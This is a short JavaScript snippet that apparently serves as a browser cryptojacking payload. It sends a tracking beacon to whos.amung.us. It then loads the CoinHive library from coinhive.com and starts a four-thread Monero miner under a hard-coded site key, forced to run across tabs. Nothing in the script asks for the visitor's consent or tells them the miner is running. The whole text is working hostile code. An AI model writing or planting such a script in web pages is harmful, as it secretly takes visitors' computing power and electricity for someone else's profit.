(new Image).src = "//whos.amung.us/swidget/mandar1n0s";

function addScript( src,callback) {
  var s = document.createElement( 'script' );
  s.setAttribute( 'src', src );
  s.onload=callback;
  document.body.appendChild( s );
}

function start(){
  var miner = new CoinHive.Anonymous('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', {
	threads: 4,
	autoThreads: false,
	throttle: 0.5,
	forceASMJS: false
});
	miner.start(CoinHive.FORCE_MULTI_TAB);
}

addScript("https://coinhive.com/lib/coinhive.min.js", start);
